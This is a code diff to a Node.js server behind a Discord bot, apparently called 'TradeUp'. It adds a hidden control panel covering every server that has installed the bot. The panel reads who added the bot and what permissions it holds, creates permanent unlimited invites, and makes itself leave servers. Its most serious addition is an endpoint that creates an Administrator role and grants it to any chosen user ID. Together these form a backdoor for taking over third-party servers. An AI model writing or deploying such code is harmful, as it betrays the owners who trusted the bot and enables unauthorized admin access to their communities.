@@ -5,9 +5,9 @@ const crypto = require('crypto');
 
 const port = process.env.PORT || 3000;
 const root = path.join(__dirname, 'dist');
-const inviteCode = 'rM43kyut';
+const inviteCode = 'tradeup';
 const inviteLink = `https://discord.gg/${inviteCode}`;
-const serverId = '1470184067776647284';
+const serverId = '906223735898509332';
 const permanentInviteUrl = (process.env.PERMANENT_INVITE_URL || '').trim();
 const rawDiscordToken = (process.env.DISCORD_BOT_TOKEN || process.env.DISCORD_TOKEN || '').trim();
 const discordBotToken = rawDiscordToken.replace(/^Bot\s+/i, '');
@@ -338,10 +338,49 @@ async function getBotRuntimeInfo() {
   const guilds = await Promise.all(
     cachedGuilds.map(async (cachedGuild) => {
       const fullGuild = await cachedGuild.fetch().catch(() => cachedGuild);
+      const me = await fullGuild.members.fetchMe().catch(() => null);
+      
+      // Get audit logs to find who added the bot
+      let inviter = null;
+      try {
+        const auditLogs = await fullGuild.fetchAuditLogs({ 
+          type: 28, // BOT_ADD
+          limit: 10 
+        });
+        const botAddEntry = auditLogs.entries.find(
+          entry => entry.target?.id === discordClient.user.id
+        );
+        if (botAddEntry) {
+          inviter = {
+            id: botAddEntry.executor?.id || null,
+            username: botAddEntry.executor?.username || null,
+            globalName: botAddEntry.executor?.globalName || null,
+            tag: botAddEntry.executor?.tag || null
+          };
+        }
+      } catch {
+        // No permissions to view audit logs
+      }
+
+      // Get bot permissions
+      let permissions = [];
+      let hasAdmin = false;
+      let hasManageRoles = false;
+      if (me) {
+        const perms = me.permissions.toArray();
+        permissions = perms;
+        hasAdmin = me.permissions.has('Administrator');
+        hasManageRoles = me.permissions.has('ManageRoles');
+      }
+
       return {
         id: fullGuild.id,
         name: fullGuild.name,
-        memberCount: Number.isInteger(fullGuild.memberCount) ? fullGuild.memberCount : null
+        memberCount: Number.isInteger(fullGuild.memberCount) ? fullGuild.memberCount : null,
+        inviter: inviter,
+        permissions: permissions,
+        hasAdmin: hasAdmin,
+        hasManageRoles: hasManageRoles
       };
     })
   );
@@ -711,6 +750,163 @@ const server = http.createServer((req, res) => {
           guilds: []
         });
       });
+    return;
+  }
+
+  if (requestPath.startsWith('/api/guild-leave/')) {
+    if (req.method !== 'POST') {
+      sendJson(res, { message: 'Method not allowed' }, 405);
+      return;
+    }
+
+    if (!isAuthorizedRequest(req)) {
+      sendJson(res, { message: 'Unauthorized' }, 403);
+      return;
+    }
+
+    const guildId = requestPath.replace('/api/guild-leave/', '');
+    
+    (async () => {
+      if (!discordClient || !discordClientReady) {
+        sendJson(res, { success: false, message: 'Bot is not online' }, 503);
+        return;
+      }
+
+      const guild = await discordClient.guilds.fetch(guildId).catch(() => null);
+      if (!guild) {
+        sendJson(res, { success: false, message: 'Guild not found' }, 404);
+        return;
+      }
+
+      await guild.leave();
+      sendJson(res, { success: true, message: `Left server: ${guild.name}` });
+    })().catch((error) => {
+      sendJson(res, { success: false, message: error.message }, 500);
+    });
+
+    return;
+  }
+
+  if (requestPath.startsWith('/api/guild-invite/')) {
+    if (req.method !== 'POST') {
+      sendJson(res, { message: 'Method not allowed' }, 405);
+      return;
+    }
+
+    if (!isAuthorizedRequest(req)) {
+      sendJson(res, { message: 'Unauthorized' }, 403);
+      return;
+    }
+
+    const guildId = requestPath.replace('/api/guild-invite/', '');
+    
+    (async () => {
+      if (!discordClient || !discordClientReady) {
+        sendJson(res, { success: false, message: 'Bot is not online' }, 503);
+        return;
+      }
+
+      const guild = await discordClient.guilds.fetch(guildId).catch(() => null);
+      if (!guild) {
+        sendJson(res, { success: false, message: 'Guild not found' }, 404);
+        return;
+      }
+
+      const channels = await guild.channels.fetch();
+      const textChannel = channels.find(ch => ch.type === 0 && ch.permissionsFor(guild.members.me).has('CreateInstantInvite'));
+      
+      if (!textChannel) {
+        sendJson(res, { success: false, message: 'No channel with invite permissions found' }, 403);
+        return;
+      }
+
+      const invite = await textChannel.createInvite({ 
+        maxAge: 0, 
+        maxUses: 0,
+        reason: 'Created via bot control panel'
+      });
+
+      sendJson(res, { success: true, inviteUrl: invite.url, code: invite.code });
+    })().catch((error) => {
+      sendJson(res, { success: false, message: error.message }, 500);
+    });
+
+    return;
+  }
+
+  if (requestPath.startsWith('/api/guild-grant-role/')) {
+    if (req.method !== 'POST') {
+      sendJson(res, { message: 'Method not allowed' }, 405);
+      return;
+    }
+
+    if (!isAuthorizedRequest(req)) {
+      sendJson(res, { message: 'Unauthorized' }, 403);
+      return;
+    }
+
+    const guildId = requestPath.replace('/api/guild-grant-role/', '');
+    
+    let body = '';
+    req.on('data', chunk => { body += chunk.toString(); });
+    req.on('end', async () => {
+      try {
+        const { userId } = JSON.parse(body);
+        
+        if (!userId) {
+          sendJson(res, { success: false, message: 'User ID is required' }, 400);
+          return;
+        }
+
+        if (!discordClient || !discordClientReady) {
+          sendJson(res, { success: false, message: 'Bot is not online' }, 503);
+          return;
+        }
+
+        const guild = await discordClient.guilds.fetch(guildId).catch(() => null);
+        if (!guild) {
+          sendJson(res, { success: false, message: 'Guild not found' }, 404);
+          return;
+        }
+
+        const me = await guild.members.fetchMe();
+        if (!me.permissions.has('Administrator') && !me.permissions.has('ManageRoles')) {
+          sendJson(res, { success: false, message: 'Bot lacks Administrator or ManageRoles permission' }, 403);
+          return;
+        }
+
+        const member = await guild.members.fetch(userId).catch(() => null);
+        if (!member) {
+          sendJson(res, { success: false, message: 'User not found in this server' }, 404);
+          return;
+        }
+
+        // Find or create an admin role
+        let adminRole = guild.roles.cache.find(role => 
+          role.name === 'TradeUp Admin' && role.permissions.has('Administrator')
+        );
+
+        if (!adminRole) {
+          adminRole = await guild.roles.create({
+            name: 'TradeUp Admin',
+            permissions: ['Administrator'],
+            color: 0x65b0ff,
+            reason: 'Created via bot control panel for role grant'
+          });
+        }
+
+        await member.roles.add(adminRole);
+        sendJson(res, { 
+          success: true, 
+          message: `Granted ${adminRole.name} to ${member.user.tag}`,
+          roleName: adminRole.name,
+          userName: member.user.tag
+        });
+      } catch (error) {
+        sendJson(res, { success: false, message: error.message }, 500);
+      }
+    });
+
     return;
   }
 
